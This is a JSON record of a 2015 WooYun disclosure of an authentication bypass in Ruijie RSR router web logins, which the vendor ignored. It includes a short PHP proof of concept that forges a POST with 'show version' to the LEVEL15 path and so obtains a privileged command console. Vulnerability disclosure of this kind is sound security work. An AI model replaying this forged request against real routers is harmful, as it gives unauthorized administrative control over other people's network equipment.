{"id": 73847, "wybug_id": "wooyun-2015-0151886", "wybug_title": "通过伪造POST数据包可绕过锐捷RSR路由器web认证", "wybug_corp": "ruijie.com.cn", "wybug_author": "五角", "wybug_date": "2015-11-04 22:17", "wybug_open_date": "2016-02-07 22:20", "wybug_type": "权限控制绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-09：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向公众公开  简要描述： 在看锐捷RSR的web登陆界面时发现登陆时以POST发送show version等信息至交换机遂在PHP下伪装一个POST包发送 结果返回拥有LEVEL15权限的web操作界面 详细说明：  \n\n这是登陆时发送的数据包\ninclude \"Snoopy.class.php\";$snoopy = new Snoopy;$LoginURL = \"http://192.168.130.13/WEB_VMS/LEVEL15/\";$snoopy->agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36';$snoopy->referer = \"http://192.168.130.13/index.htm\";$Data=\"command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.\";$snoopy->submit_text($LoginURL,$Data);var_dump((string)$snoopy->results);\n这是测试的代码 如果在这里发送show run等会提示没有权限 但是发送show version后会返回一个页面 \n\n这里可以用LEVEL15权限执行命令   漏洞证明：  \n\n执行show run的结果由于这套网络系统是近期由网络公司安装的 由此推断目前市面上大部分RSR路由有这个漏洞   修复方案：  。。。加个包的检测  对于用户而言。。web关了吧   版权声明：转载请注明来源 五角@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-07 22:20 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}